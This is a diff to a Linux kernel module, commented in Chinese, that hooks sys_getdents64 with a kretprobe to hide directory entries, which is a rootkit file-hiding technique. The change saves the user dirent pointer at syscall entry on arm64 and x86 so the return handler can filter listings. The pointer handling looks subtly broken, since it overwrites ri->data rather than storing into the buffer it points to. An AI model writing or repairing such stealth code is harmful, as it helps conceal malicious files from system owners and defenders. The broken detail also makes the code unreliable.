@@ -166,10 +166,20 @@ struct linux_dirent64 {
 /* Kprobe for sys_getdents64 - 使用 return handler */
 static int hidden_entries_count;
 
-/* Return handler - 在 syscall 返回后过滤结果 */
+/* 数据结构用于传递参数 */
+struct getdents64_data {
+	struct linux_dirent64 __user *dirent;
+};
+
+/* Entry handler - 保存参数 */
 static int getdents64_rp_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	/* nothing to do pre-return */
+	/* 在 entry 时保存 dirent 参数 */
+#ifdef __aarch64__
+	ri->data = (void *)regs->regs[1];
+#else
+	ri->data = (void *)regs->di;
+#endif
 	return 0;
 }
 
@@ -184,13 +194,14 @@ static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *
 	int entries_checked = 0, entries_hidden = 0;
 	int i;
 
+	/* 从 entry handler 保存的数据中获取 dirent */
+	dirent = (struct linux_dirent64 __user *)ri->data;
+
 	/* 获取返回值 - x0 for arm64 */
 #ifdef __aarch64__
 	ret = regs->regs[0];
-	dirent = (struct linux_dirent64 __user *)regs->regs[1];
 #else
 	ret = regs->ax;
-	dirent = (struct linux_dirent64 __user *)regs->di;
 #endif
 
 	if (ret <= 0)
@@ -279,7 +290,7 @@ static struct kretprobe rp_getdents64 = {
 #endif
 	.entry_handler = getdents64_rp_pre,
 	.handler = getdents64_rp_handler,
-	.data_size = 0,
+	.data_size = sizeof(void *),
 	.maxactive = 4,
 };
 
